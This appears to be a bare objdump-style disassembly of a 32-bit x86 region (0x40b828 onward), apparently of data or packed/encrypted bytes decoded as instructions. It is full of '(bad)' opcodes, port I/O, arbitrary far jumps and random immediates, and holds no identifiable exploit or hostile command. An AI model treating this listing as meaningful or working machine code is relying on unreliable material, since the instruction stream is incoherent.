  40b828:	xchg   edx,eax
  40b829:	add    al,BYTE PTR [eax]
  40b82b:	mov    dl,0xbc
  40b82d:	dec    esi
  40b82e:	cwde   
  40b82f:	push   edi
  40b830:	test   al,0x26
  40b832:	addr16 in al,dx
  40b834:	cmp    al,0x32
  40b836:	add    edi,DWORD PTR [ebp-0x67]
  40b839:	dec    BYTE PTR [edi]
  40b83b:	jo     0x40b8a8
  40b83d:	in     eax,0x2c
  40b83f:	adc    DWORD PTR ds:0x3f46aeed,ebp
  40b845:	ins    BYTE PTR es:[edi],dx
  40b846:	adc    dl,cl
  40b848:	jge    0x40b7d9
  40b84a:	or     al,0x27
  40b84c:	repnz aas 
  40b84e:	mov    ch,0xdc
  40b850:	ficomp DWORD PTR [edi]
  40b852:	js     0x40b88d
  40b854:	push   ebx
  40b855:	(bad)  
  40b856:	popa   
  40b857:	rcl    BYTE PTR [esp+ebx*2-0x70],cl
  40b85b:	mov    eax,0xe65b77c
  40b860:	cmp    edx,edi
  40b862:	push   esp
  40b863:	je     0x40b8d5
  40b865:	mov    ebp,0xab265bef
  40b86a:	xchg   BYTE PTR [eax],ch
  40b86c:	in     eax,dx
  40b86d:	cld    
  40b86e:	cli    
  40b86f:	pop    edx
  40b870:	scas   eax,DWORD PTR es:[edi]
  40b871:	xchg   ecx,eax
  40b872:	mov    ebx,0x137ef0ce
  40b877:	sahf   
  40b878:	fisubr DWORD PTR [edx+0x6533459d]
  40b87e:	add    BYTE PTR [esi-0x2f],bl
  40b881:	adc    edi,eax
  40b883:	push   eax
  40b884:	es inc eax
  40b886:	mov    dl,0xe1
  40b888:	ss mov ecx,ds
  40b88b:	and    ecx,DWORD PTR [edi+0x3ac8db]
  40b891:	pop    es
  40b892:	mov    cl,bh
  40b894:	jge    0x40b83f
  40b896:	es inc eax
  40b898:	cs ret 
  40b89a:	cmp    ebp,DWORD PTR [eax+0x52]
  40b89d:	fcmovbe st,st(3)
  40b89f:	ins    DWORD PTR es:[edi],dx
  40b8a0:	rcr    BYTE PTR [ebx+ecx*1],0x2
  40b8a4:	adc    DWORD PTR [ebp+0x5c],eax
  40b8a7:	neg    DWORD PTR [esi+0x5b30458f]
  40b8ad:	sub    al,0x37
  40b8af:	hlt    
  40b8b0:	xchg   esi,eax
  40b8b1:	and    ecx,DWORD PTR [ebp-0x30]
  40b8b4:	mov    BYTE PTR [eax-0x23bee66d],ah
  40b8ba:	mov    ds,edx
  40b8bc:	or     esp,DWORD PTR [eax-0x53987763]
  40b8c2:	ja     0x40b901
  40b8c4:	mov    dl,0x1b
  40b8c6:	outs   dx,DWORD PTR ds:[esi]
  40b8c7:	loop   0x40b849
  40b8c9:	fsub   QWORD PTR [ebx]
  40b8cb:	jle    0x40b877
  40b8cd:	retf   0xc7a1
  40b8d0:	push   esi
  40b8d1:	jp     0x40b941
  40b8d3:	inc    edx
  40b8d4:	or     DWORD PTR [ecx+edx*8-0x78e9af50],0x3dc848b3
  40b8df:	push   ebp
  40b8e0:	ss shr al,0x87
  40b8e4:	retf   0xf788
  40b8e7:	bound  esp,QWORD PTR [esi-0x3a0b2442]
  40b8ed:	hlt    
  40b8ee:	test   DWORD PTR [esi-0x15],ecx
  40b8f1:	sbb    edx,ebx
  40b8f3:	or     eax,0xbd993747
  40b8f8:	jle    0x40b962
  40b8fa:	push   ds
  40b8fb:	arpl   WORD PTR [edi+eax*1-0x1b],sp
  40b8ff:	jnp    0x40b978
  40b901:	xchg   ebp,eax
  40b902:	adc    al,0x79
  40b904:	repnz aad 0xfd
  40b907:	push   0xd0dc2fc1
  40b90c:	(bad)
  40b910:	or     DWORD PTR gs:[ecx],esi
  40b913:	sub    dh,dh
  40b915:	sbb    edx,ebx
  40b917:	dec    edi
  40b918:	call   0x2622:0x7317ed78
  40b91f:	sbb    DWORD PTR [ebx],esp
  40b921:	mov    dh,0xba
  40b923:	stos   DWORD PTR es:[edi],eax
  40b924:	sbb    edx,esi
  40b926:	pop    esp
  40b927:	ds loop 0x40b97b
  40b92a:	jmp    0x9069:0x45046364
  40b931:	(bad)  
  40b932:	cld    
  40b933:	pop    ds
  40b934:	outs   dx,DWORD PTR ds:[esi]
  40b935:	mov    ds:0x7efea39a,eax
  40b93a:	call   0x6ef1e622
  40b93f:	cmc    
  40b940:	sub    al,dh
  40b942:	mov    ds:0x671bd267,al
  40b947:	dec    ecx
  40b948:	(bad)  
  40b949:	jecxz  0x40b9a0
  40b94b:	add    dl,cl
  40b94d:	pop    esi
  40b94e:	shr    DWORD PTR [ecx-0xa],cl
  40b951:	rcl    BYTE PTR [ebp+0x17],1
  40b954:	arpl   WORD PTR [esi-0x4b],bx
  40b957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b958:	sbb    eax,0xfbcd3837
  40b95d:	js     0x40b90a
  40b95f:	cmp    ch,BYTE PTR [ecx]
  40b961:	icebp  
  40b962:	sub    BYTE PTR [edx-0x572634b],bh
  40b968:	icebp  
  40b969:	inc    edx
  40b96a:	jnp    0x40b8fe
  40b96c:	js     0x40b8f8
  40b96e:	fsub   DWORD PTR [edi]
  40b970:	outs   dx,DWORD PTR ds:[esi]
  40b971:	sbb    eax,DWORD PTR [ebx+0x1294517b]
  40b977:	aaa    
  40b978:	xchg   ebx,eax
  40b979:	jle    0x40b9e1
  40b97b:	in     al,0xa1
  40b97d:	jmp    0xea8b:0xe6fa2231
  40b984:	inc    eax
  40b985:	out    0xf8,al
  40b987:	push   ds
  40b988:	cli    
  40b989:	cmp    BYTE PTR [ebp-0x55],cl
  40b98c:	bound  edi,QWORD PTR [ebp+0x19]
  40b98f:	xchg   ebx,eax
  40b990:	adc    al,0xb9
  40b992:	loopne 0x40b936
  40b994:	sbb    BYTE PTR [eax],dh
  40b996:	jno    0x40b946
  40b998:	jle    0x40b9e9
  40b99a:	push   0xffffffff
  40b99c:	fist   WORD PTR [ecx]
  40b99e:	jo     0x40b923
  40b9a0:	pop    ecx
  40b9a1:	jns    0x40b9fe
  40b9a3:	mov    DWORD PTR [esi-0x75],edx
  40b9a6:	push   es
  40b9a7:	scas   eax,DWORD PTR es:[edi]
  40b9a8:	sbb    BYTE PTR [ecx],bl
  40b9aa:	dec    esi
  40b9ab:	ror    eax,cl
  40b9ad:	retf   
  40b9ae:	scas   eax,DWORD PTR es:[edi]
  40b9af:	ficom  DWORD PTR [edx-0x734cf3e]
  40b9b5:	pop    edi
  40b9b6:	xor    DWORD PTR [eax-0x50],eax
  40b9b9:	in     al,dx
  40b9ba:	mov    fs,WORD PTR [edi-0x2e0cfb88]
  40b9c0:	cdq    
  40b9c1:	repnz pop esi
  40b9c3:	shl    DWORD PTR [edi-0x7e8b00cb],1
  40b9c9:	sub    ecx,DWORD PTR [eax]
  40b9cb:	fst    DWORD PTR [ebx+0x47]
  40b9ce:	pop    ds
  40b9cf:	dec    edi
  40b9d0:	pop    esp
  40b9d1:	daa    
  40b9d2:	xchg   esp,eax
  40b9d3:	int3   
  40b9d4:	inc    edi
  40b9d5:	xor    eax,0x26f7edd6
  40b9da:	sahf   
  40b9db:	loopne 0x40b99c
  40b9dd:	loopne 0x40b9de
  40b9df:	(bad)  
  40b9e0:	xchg   esi,eax
  40b9e1:	sbb    al,0xc4
  40b9e3:	loop   0x40b9b4
  40b9e5:	cdq    
  40b9e6:	xor    cl,BYTE PTR [edi]
  40b9e8:	je     0x40ba4f
  40b9ea:	mov    WORD PTR [ebp-0x18],?
  40b9ed:	popfw  
  40b9ef:	icebp  
  40b9f0:	sub    eax,0x36be4d5f
  40b9f5:	mov    ch,0xe
  40b9f7:	mov    DWORD PTR [edx-0x75],ebp
  40b9fa:	call   0xe6b9fa4
  40b9ff:	shl    BYTE PTR [edi+0x65],0xea
  40ba03:	xchg   ebp,eax
  40ba04:	jge    0x40ba79
  40ba06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba07:	push   ebx
  40ba08:	pop    ebp
  40ba09:	cmp    ecx,DWORD PTR [edx+0x4a900cf3]
  40ba0f:	mov    al,ds:0x8299f7b0
  40ba14:	add    DWORD PTR [esi-0x32],0x6fface36
  40ba1b:	rcr    bl,0xbf
  40ba1e:	jmp    0x94ca:0x13f41015
  40ba25:	int    0x67
  40ba27:	sahf   
  40ba28:	cmp    eax,0x73faf1f5
  40ba2d:	sub    BYTE PTR [edi+0x4a2cdded],bl
  40ba33:	aas    
  40ba34:	sbb    eax,0xda1d1a2
  40ba39:	pusha  
  40ba3a:	pop    esi
  40ba3b:	out    0x7f,eax
  40ba3d:	es fcmovnbe st,st(0)
  40ba40:	(bad)  
  40ba41:	mov    bl,0x1e
  40ba43:	add    eax,0x37701f7f
  40ba48:	adc    ch,BYTE PTR [ecx]
  40ba4a:	mov    esi,0x5b087fd7
  40ba4f:	ins    DWORD PTR es:[edi],dx
  40ba50:	dec    ebx
  40ba51:	and    dl,BYTE PTR [ebp-0x11]
  40ba54:	lds    ecx,FWORD PTR [ebp+0x38f8065c]
  40ba5a:	sub    DWORD PTR [ecx+0x5e799d4],0xf05f3318
  40ba64:	inc    esi
  40ba65:	mov    al,ds:0xf565bace
  40ba6a:	adc    eax,esi
  40ba6c:	sub    al,0x10
  40ba6e:	sbb    BYTE PTR [ebp-0x5],0x55
  40ba72:	loope  0x40baa4
  40ba74:	inc    eax
  40ba75:	sub    eax,0xa2aa755d
  40ba7a:	xor    eax,0x640a8063
  40ba7f:	mov    esi,ss
  40ba81:	fsubr  QWORD PTR [ebp-0x3a]
  40ba84:	xchg   esp,eax
  40ba85:	push   0xffffff97
  40ba87:	adc    al,0xc5
  40ba89:	push   ss
  40ba8a:	add    ebp,esi
  40ba8c:	idiv   ecx
  40ba8e:	mov    edi,DWORD PTR [edx-0x31]
  40ba91:	in     al,dx
  40ba92:	shl    edx,1
  40ba94:	outs   dx,DWORD PTR ds:[esi]
  40ba95:	scas   al,BYTE PTR es:[edi]
  40ba96:	mov    ecx,0x39308652
  40ba9b:	push   ecx
  40ba9c:	ret    0x51c4
  40ba9f:	lods   al,BYTE PTR ds:[esi]
  40baa0:	pop    ss
  40baa1:	cmp    bl,BYTE PTR [eax]
  40baa3:	sub    WORD PTR [esi-0x80],sp
  40baa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baa8:	rcl    ecx,1
  40baaa:	loop   0x40baed
  40baac:	aam    0xb2
  40baae:	cmp    BYTE PTR [edi-0x6ac1f714],dl
  40bab4:	aad    0xc2
  40bab6:	das    
  40bab7:	dec    ebx
  40bab8:	jl     0x40baef
  40baba:	jbe    0x40baa8
  40babc:	(bad)  
  40babd:	jmp    edx
  40babf:	inc    esp
  40bac0:	aas    
  40bac1:	shl    DWORD PTR [eax+ebx*4],0x67
  40bac5:	punpcklwd mm2,DWORD PTR [edi+0x5a]
  40bac9:	js     0x40bac9
  40bacb:	pushf  
  40bacc:	mov    ds:0xcd6a1058,al
  40bad1:	fs push ecx
  40bad3:	inc    ecx
  40bad4:	push   0x62
  40bad6:	hlt    
  40bad7:	fs cmp eax,0x466c123c
  40badd:	add    ch,dl
  40badf:	(bad)  
  40bae0:	pop    es
  40bae1:	aad    0xa5
  40bae3:	lock es cmp eax,0xcbd64ae1
  40baea:	scas   eax,DWORD PTR es:[edi]
  40baeb:	fucomi st,st(2)
  40baed:	jmp    0x4a00dc56
  40baf2:	xchg   ecx,eax
  40baf3:	mov    edi,0xabdf292a
  40baf8:	cdq    
  40baf9:	mov    ds:0xad27054f,eax
  40bafe:	dec    eax
  40baff:	adc    BYTE PTR [esi+0x43],dl
  40bb02:	push   esp
  40bb03:	adc    eax,0xac0594f8
  40bb08:	retf   0x6b68
  40bb0b:	mov    esp,0xd710653e
  40bb10:	pop    es
  40bb11:	push   esp
  40bb12:	popf   
  40bb13:	jns    0x40bb38
  40bb15:	lods   al,BYTE PTR ds:[esi]
  40bb16:	popa   
  40bb17:	sbb    eax,0xed1be230
  40bb1c:	sub    DWORD PTR [esi],edi
  40bb1e:	pop    esi
  40bb1f:	outs   dx,BYTE PTR ds:[esi]
  40bb20:	cdq    
  40bb21:	mov    ebp,0xf8028ca1
  40bb26:	stc    
  40bb27:	sub    eax,0x589016ef
  40bb2c:	jmp    0x40bb28
  40bb2e:	(bad)  
  40bb2f:	test   al,0x4c
  40bb31:	mov    ds:0xd3339b96,al
  40bb36:	mov    dh,0xf6
  40bb38:	mov    dh,0xbf
  40bb3a:	in     al,dx
  40bb3b:	sti    
  40bb3c:	and    ebp,ebp
  40bb3e:	pop    ecx
  40bb3f:	jns    0x40bb15
  40bb41:	test   al,0x3
  40bb43:	xchg   edi,eax
  40bb44:	jp     0x40bb2f
  40bb46:	mov    esi,0x246ad201
  40bb4b:	pop    edx
  40bb4c:	mov    bl,0x47
  40bb4e:	xchg   BYTE PTR [ecx+0x36],dl
  40bb51:	xor    BYTE PTR [edx+0x6cc032d6],cl
  40bb57:	mov    ds:0x52acd815,al
  40bb5c:	not    BYTE PTR [edi]
  40bb5e:	retf   0x9e67
  40bb61:	adc    dh,BYTE PTR [ebx+0x631b4610]
  40bb67:	retf   
  40bb68:	(bad)  
  40bb69:	stos   BYTE PTR es:[edi],al
  40bb6a:	push   edx
  40bb6b:	mul    BYTE PTR [esi-0x7]
  40bb6e:	(bad)  
  40bb6f:	mov    es,WORD PTR [ecx]
  40bb71:	sbb    DWORD PTR [ecx+0x6d],0xbf1dc6c9
  40bb78:	sub    ebp,DWORD PTR [edx+0x6aa34c74]
  40bb7e:	mov    ebp,0xf080bcc0
  40bb83:	jns    0x40bb1f
  40bb85:	adc    DWORD PTR [esi-0x1c],ebx
  40bb88:	jmp    FWORD PTR [edx-0x35]
  40bb8b:	cmp    al,0x42
  40bb8d:	inc    eax
  40bb8e:	mov    esi,0x504284f
  40bb93:	stos   DWORD PTR es:[edi],eax
  40bb94:	pop    ebx
  40bb95:	sub    DWORD PTR [ecx+0x310834fb],esi
  40bb9b:	cwde   
  40bb9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb9d:	stc    
  40bb9e:	dec    edi
  40bb9f:	pop    esi
  40bba0:	dec    ecx
  40bba1:	jne    0x40bbd0
  40bba3:	xchg   ebx,eax
  40bba4:	loop   0x40bb34
  40bba6:	or     BYTE PTR [esi+0x67],0x36
  40bbaa:	xchg   esi,eax
  40bbab:	sub    DWORD PTR [eax],0xffffff84
  40bbae:	jle    0x40bc02
  40bbb0:	xor    al,0x64
  40bbb2:	js     0x40bb88
  40bbb4:	mov    ecx,0x479b483c
  40bbb9:	mov    ch,0x8
  40bbbb:	adc    eax,0x482e7822
  40bbc0:	mov    ah,cl
  40bbc2:	push   ecx
  40bbc3:	mov    ah,0x45
  40bbc5:	in     al,dx
  40bbc6:	imul   edx,DWORD PTR [ebx],0xffffffb0
  40bbc9:	jle    0x40bbe5
  40bbcb:	jp     0x40bc0c
  40bbcd:	jbe    0x40bbc3
  40bbcf:	fwait
  40bbd0:	xor    eax,edx
  40bbd2:	js     0x40bc35
  40bbd4:	sti    
  40bbd5:	dec    ecx
  40bbd6:	in     al,dx
  40bbd7:	jb     0x40bbd8
  40bbd9:	in     eax,dx
  40bbda:	inc    eax
  40bbdb:	jbe    0x40bb9b
  40bbdd:	jp     0x40bc1b
  40bbdf:	mov    gs,WORD PTR [edi]
  40bbe1:	dec    eax
  40bbe2:	jne    0x40bc21
  40bbe4:	sbb    esi,eax
  40bbe6:	jle    0x40bc24
  40bbe8:	fwait
  40bbe9:	in     eax,0x10
  40bbeb:	pop    ecx
  40bbec:	pop    esp
  40bbed:	xchg   ch,ch
  40bbef:	xchg   esi,eax
  40bbf0:	jb     0x40bb88
  40bbf2:	or     BYTE PTR [ecx-0x438f5cfc],ch
  40bbf8:	xor    BYTE PTR ds:0xf88680fd,0x2b
  40bbff:	pop    es
  40bc00:	iret   
  40bc01:	js     0x40bbe0
  40bc03:	repz cmp BYTE PTR [ebx],bh
  40bc06:	sub    bh,BYTE PTR [edx]
  40bc08:	xor    edx,eax
  40bc0a:	push   edi
  40bc0b:	cs push eax
  40bc0d:	les    esp,FWORD PTR [edi+0x197f92e]
  40bc13:	push   esp
  40bc14:	mov    DWORD PTR [ebx-0xbb52fa7],edx
  40bc1a:	xor    eax,0x5984f327
  40bc1f:	and    al,0xf0
  40bc21:	add    cl,ch
  40bc23:	sti    
  40bc24:	add    eax,0xd778e55
  40bc29:	pop    esi
  40bc2a:	jle    0x40bc5f
  40bc2c:	(bad)  
  40bc2e:	test   cl,ch
  40bc30:	test   eax,0xee8cfe8e
  40bc35:	xor    DWORD PTR [eax],ebx
  40bc37:	xor    eax,0xdd55af6f
  40bc3c:	in     eax,dx
  40bc3d:	icebp  
  40bc3e:	push   edi
  40bc3f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc41:	into   
  40bc42:	add    eax,0xa8bd27d2
  40bc47:	lods   eax,DWORD PTR ds:[esi]
  40bc48:	ins    BYTE PTR es:[edi],dx
  40bc49:	xor    al,bh
  40bc4b:	push   ebp
  40bc4c:	stc    
  40bc4d:	cwde   
  40bc4e:	dec    edx
  40bc4f:	mov    dh,0x31
  40bc51:	stos   DWORD PTR es:[edi],eax
  40bc52:	or     ch,dh
  40bc54:	mov    ecx,0xcf468cb7
  40bc59:	lods   al,BYTE PTR ds:[esi]
  40bc5a:	sbb    DWORD PTR [edi-0x1bc551d7],ebx
  40bc60:	call   0xa4a500d4
  40bc65:	inc    edi
  40bc66:	stc    
  40bc67:	add    bl,BYTE PTR [edx]
  40bc69:	push   cs
  40bc6a:	xor    BYTE PTR [eax+edx*4-0x7a5cd10c],dh
  40bc71:	xchg   BYTE PTR [eax],dl
  40bc73:	fld    DWORD PTR [edi-0x47]
  40bc76:	push   ds
  40bc77:	pop    es
  40bc78:	shl    BYTE PTR [esi+0x1d2d62c7],1
  40bc7e:	mov    edx,0xde53966e
  40bc83:	mov    ebp,0x5b760a1
  40bc88:	mov    bl,0x3d
  40bc8a:	xchg   DWORD PTR [edx-0x69589434],esi
  40bc90:	mov    ds:0xdad50e32,al
  40bc95:	pop    ebp
  40bc96:	jne    0x40bce2
  40bc98:	jb     0x40bc9e
  40bc9a:	ins    DWORD PTR es:[edi],dx
  40bc9b:	mov    esp,0xf96d3e7b
  40bca0:	in     al,0x7f
  40bca2:	fstp   TBYTE PTR [eax]
  40bca4:	mov    bh,0x34
  40bca6:	mov    eax,0x6757408b
  40bcab:	dec    eax
  40bcac:	dec    esi
  40bcad:	xchg   ecx,eax
  40bcae:	pushf  
  40bcaf:	leave  
  40bcb0:	daa    
  40bcb1:	mov    edx,0xb79f0591
  40bcb6:	cmc    
  40bcb7:	imul   ebx,DWORD PTR [esi+eiz*8-0x434b5e2f],0x2
  40bcbf:	xor    ebx,ecx
  40bcc1:	mov    dh,0xb1
  40bcc3:	pop    ss
  40bcc4:	rol    DWORD PTR [ebp+0x61e0605f],1
  40bcca:	fnstenv ds:0xa69703f6
  40bcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcd1:	or     ebp,DWORD PTR es:[esi+0x5f]
  40bcd5:	adc    dh,BYTE PTR [edx-0x52]
  40bcd8:	dec    eax
  40bcd9:	jnp    0x40bcb6
  40bcdb:	mov    edx,0x2e154681
  40bce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bce1:	jmp    0xed4be0c8
  40bce6:	push   ss
  40bce7:	mov    ds:0x87eadf20,al
  40bcec:	fs enter 0x5683,0xc4
  40bcf1:	lds    esp,FWORD PTR ds:0xc3f09518
  40bcf7:	sbb    edi,DWORD PTR [edx]
  40bcf9:	aaa    
  40bcfa:	popa   
  40bcfb:	loope  0x40bcc0
  40bcfd:	retf   
  40bcfe:	xchg   ecx,eax
  40bcff:	ffree  st(0)
  40bd01:	leave  
  40bd02:	sbb    edx,DWORD PTR [eax+0x5e5ffb7c]
  40bd08:	shl    ebp,0x44
  40bd0b:	add    esi,DWORD PTR [edx+0x59]
  40bd0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd0f:	or     eax,DWORD PTR [eax]
  40bd11:	lahf   
  40bd12:	ins    DWORD PTR es:[edi],dx
  40bd13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd14:	icebp  
  40bd15:	jno    0x40bd56
  40bd17:	std    
  40bd18:	push   ds
  40bd19:	jnp    0x40bd4c
  40bd1b:	cmp    edi,edx
  40bd1d:	push   cs
  40bd1e:	cli    
  40bd1f:	and    DWORD PTR [ecx-0x5],eax
  40bd22:	adc    eax,0x67ec6bd3
  40bd27:	inc    esp
  40bd28:	mov    esp,0x69b5eda4
  40bd2d:	mov    esp,0xc12cb77e
  40bd32:	mov    WORD PTR [ebp-0x46],cs
  40bd35:	sahf   
  40bd36:	mov    ebp,0x50b3af18
  40bd3b:	jo     0x40bdbb
  40bd3d:	push   edi
  40bd3e:	(bad)  
  40bd3f:	pusha  
  40bd40:	pop    es
  40bd41:	aam    0xdd
  40bd43:	inc    esp
  40bd44:	xor    ebx,esi
  40bd46:	fs mov bh,0x34
  40bd49:	mov    esp,0x21fb98cd
  40bd4e:	imul   eax,DWORD PTR [eax+0xe],0x190bd29f
  40bd55:	xchg   esp,eax
  40bd56:	enter  0x2d56,0x3
  40bd5a:	push   es
  40bd5b:	les    esi,FWORD PTR [eax]
  40bd5d:	mov    esi,0x4c1627f3
  40bd62:	aas    
  40bd63:	imul   BYTE PTR [edx]
  40bd65:	repnz repz and esi,DWORD PTR [ebx+0x4a]
  40bd6a:	dec    esp
  40bd6b:	sti    
  40bd6c:	cmp    cl,ch
  40bd6e:	(bad)  
  40bd6f:	retf   
  40bd70:	mov    bh,BYTE PTR [eax+0x7ea84e84]
  40bd76:	loope  0x40bd2e
  40bd78:	and    ah,BYTE PTR [esp+ecx*1+0x412bf200]
  40bd7f:	data16 mov al,0xe6
  40bd82:	sbb    DWORD PTR [edx+0x20e27d19],ecx
  40bd88:	or     DWORD PTR fs:[esi],0x4c2f39c9
  40bd8f:	dec    ecx
  40bd90:	popf   
  40bd91:	nop
  40bd92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd93:	fnsave [eax]
  40bd95:	jbe    0x40bd4a
  40bd97:	jne    0x40bd30
  40bd99:	mov    al,BYTE PTR [ecx+0x5a62bca8]
  40bd9f:	ins    DWORD PTR es:[edi],dx
  40bda0:	ins    BYTE PTR es:[edi],dx
  40bda1:	push   0xfffffff4
  40bda3:	out    dx,al
  40bda4:	jg     0x40be1c
  40bda6:	adc    ch,dh
  40bda8:	and    dh,BYTE PTR [eax]
  40bdaa:	mov    esp,0xa243ab0f
  40bdaf:	jo     0x40be30
  40bdb1:	es push es
  40bdb3:	mov    cl,0xe1
  40bdb5:	stos   BYTE PTR es:[edi],al
  40bdb6:	in     al,dx
  40bdb7:	add    eax,0x9f521da3
  40bdbc:	pop    edi
  40bdbd:	push   ebp
  40bdbe:	mov    ecx,0xa32ee45d
  40bdc3:	ret    0xad5
  40bdc6:	jge    0x40bdc2
  40bdc8:	xchg   esi,eax
  40bdc9:	(bad)  
  40bdca:	adc    bl,BYTE PTR [eax+0x31c539eb]
  40bdd0:	cli    
  40bdd1:	mov    ch,0x63
  40bdd3:	pop    esp
  40bdd4:	add    ebx,DWORD PTR ds:0x3974aea4
  40bdda:	ss idiv esi
  40bddd:	test   eax,0xb4eef649
  40bde2:	or     DWORD PTR [edi-0x50],eax
  40bde5:	shl    dl,0x22
  40bde8:	mov    al,0x8
  40bdea:	out    0xd4,eax
  40bdec:	pusha  
  40bded:	std    
  40bdee:	and    dl,ch
  40bdf0:	sub    BYTE PTR [ebx+0x6e],0x91
  40bdf4:	pop    edx
  40bdf5:	cmp    eax,DWORD PTR [eax+0x5a]
  40bdf8:	es test al,0x1a
  40bdfb:	xchg   esp,eax
  40bdfc:	scas   al,BYTE PTR es:[edi]
  40bdfd:	in     al,0xa4
  40bdff:	arpl   di,dx
  40be01:	cwde   
  40be02:	leave  
  40be03:	sbb    BYTE PTR [edi-0x2da373db],al
  40be09:	test   al,0x86
  40be0b:	adc    al,0x6d
  40be0d:	jbe    0x40be55
  40be0f:	jae    0x40be1e
  40be11:	idiv   edi
  40be13:	sub    eax,0xb70ad84
  40be18:	mov    al,0x86
  40be1a:	add    eax,0xc651f868
  40be1f:	push   esp
  40be20:	pop    ecx
  40be21:	data16 mov al,0xd
  40be24:	in     al,0x75
  40be26:	(bad)  
  40be27:	jl     0x40bdcf
  40be29:	adc    dh,bh
  40be2b:	add    al,BYTE PTR [edx+0x28da8c4f]
  40be31:	add    edi,esi
  40be33:	add    ah,BYTE PTR [esi+0x7f]
  40be36:	sbb    DWORD PTR [ecx],edi
  40be38:	fild   WORD PTR [esi]
  40be3a:	outs   dx,DWORD PTR ds:[esi]
  40be3b:	sahf   
  40be3c:	sub    edx,DWORD PTR [eax+0x3d640873]
  40be42:	stos   DWORD PTR es:[edi],eax
  40be43:	cmp    ah,bh
  40be45:	mov    eax,0x1d4d249e
  40be4a:	aaa    
  40be4b:	or     eax,0x6b5d10e4
  40be50:	jg     0x40becd
  40be52:	push   es
  40be53:	iret   
  40be54:	adc    edx,DWORD PTR [ecx-0x32]
  40be57:	sub    BYTE PTR [edi-0x27e2db7a],ch
  40be5d:	push   edx
  40be5e:	ret    0x8aea
  40be61:	sbb    al,0x5e
  40be63:	mul    DWORD PTR [esi]
  40be65:	jmp    0x40becb
  40be67:	ret    
  40be68:	sub    DWORD PTR [esp+ebx*4-0x61],0x1d
  40be6d:	push   ds
  40be6e:	lods   al,BYTE PTR ds:[esi]
  40be6f:	mov    ebx,DWORD PTR ds:0x63e3933d
  40be75:	in     eax,0x72
  40be77:	or     DWORD PTR [eax],edi
  40be79:	popa   
  40be7a:	popa   
  40be7b:	je     0x40be19
  40be7d:	mov    BYTE PTR [edi+0x566a42a5],al
  40be83:	in     al,dx
  40be84:	clc    
  40be85:	mov    ah,0x63
  40be87:	pushf  
  40be88:	inc    edi
  40be89:	xor    BYTE PTR [eax-0x34],al
  40be8c:	xor    ah,BYTE PTR [edx+0x15]
  40be8f:	inc    ebx
  40be90:	mov    edx,0xfa1f2eb3
  40be95:	xchg   edx,eax
  40be96:	push   es
  40be97:	push   ss
  40be98:	mov    eax,0x2cb4f7b9
  40be9d:	and    BYTE PTR [edx-0x17],ch
  40bea0:	test   DWORD PTR [edi-0x4],esp
  40bea3:	sub    eax,DWORD PTR [esi+esi*4-0x3c5d3098]
  40beaa:	dec    edx
  40beab:	rcl    DWORD PTR [edi-0x62b1d5b6],cl
  40beb1:	inc    esp
  40beb2:	cmp    al,0x4
  40beb4:	jge    0x40be7e
  40beb6:	xor    ch,BYTE PTR ds:0xbb1382c6
  40bebc:	add    BYTE PTR [edx-0x11],0x51
  40bec0:	test   al,0x18
  40bec2:	not    edi
  40bec4:	outs   dx,DWORD PTR ds:[esi]
  40bec5:	ret    0xc22
  40bec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bec9:	iret   
  40beca:	mov    al,0x7c
  40becc:	fsubr  QWORD PTR [edi+0x55]
  40becf:	push   esi
  40bed0:	add    DWORD PTR [esi+0x42],0xd41887f7
  40bed7:	push   cs
  40bed8:	(bad)  
  40bed9:	inc    eax
  40beda:	imul   DWORD PTR [ebp+0x57]
  40bedd:	xor    BYTE PTR [ecx+0x7d09ab96],cl
  40bee3:	xchg   BYTE PTR [ecx-0x5c36b5bd],al
  40bee9:	xor    cl,bl
  40beeb:	adc    al,dh
  40beed:	mov    esp,0x8c429283
  40bef2:	inc    ebx
  40bef3:	mov    al,ds:0xf524bc3b
  40bef8:	aam    0xf
  40befa:	dec    edx
  40befb:	sub    DWORD PTR [eax+eax*1+0x40],0x1
  40bf00:	xchg   BYTE PTR [edi+0x8],bl
  40bf03:	xlat   BYTE PTR ds:[ebx]
  40bf04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf05:	jb     0x40beb4
  40bf07:	into   
  40bf08:	(bad)  
  40bf09:	lahf   
  40bf0a:	stos   BYTE PTR es:[edi],al
  40bf0b:	inc    ebx
  40bf0c:	jp     0x40bf0b
  40bf0e:	dec    eax
  40bf0f:	aas    
  40bf10:	(bad)  
  40bf11:	sti    
  40bf12:	inc    edi
  40bf13:	cmp    ecx,DWORD PTR [esi-0x17ce95ad]
  40bf19:	pop    ebp
  40bf1a:	push   edi
  40bf1b:	cmp    bh,ah
  40bf1d:	mov    DWORD PTR [ebx-0x54],ebx
  40bf20:	ds pop ebp
  40bf22:	adc    DWORD PTR [eax-0x7ea9eeb8],ebp
  40bf28:	call   0x8b160d7c
  40bf2d:	pop    ecx
  40bf2e:	je     0x40bef2
  40bf30:	imul   edi,DWORD PTR [ebx],0x4e479273
  40bf36:	jecxz  0x40bed6
  40bf38:	nop
  40bf39:	pop    edx
  40bf3a:	push   0x7121e278
  40bf3f:	mov    cl,0x31
  40bf41:	ret    0x9ef3
  40bf44:	mov    edx,0x348d9ed2
  40bf49:	mov    ebp,?
  40bf4b:	outs   dx,DWORD PTR ds:[esi]
  40bf4c:	mov    BYTE PTR gs:[edx+0x60],dh
  40bf50:	(bad)  
  40bf52:	jnp    0x40bf63
  40bf54:	aam    0xd
  40bf56:	dec    eax
  40bf57:	cmc    
  40bf58:	xor    esi,DWORD PTR [ebp-0x1d2adcfb]
  40bf5e:	loop   0x40bfc6
  40bf60:	mov    edi,0x47cd30af
  40bf65:	(bad)  
  40bf67:	add    BYTE PTR [edx-0x11c79f15],al
  40bf6d:	sub    DWORD PTR [eax+ecx*8-0x403fcb3a],edx
  40bf74:	(bad)  
  40bf76:	xchg   ebx,edi
  40bf78:	push   edx
  40bf79:	inc    ecx
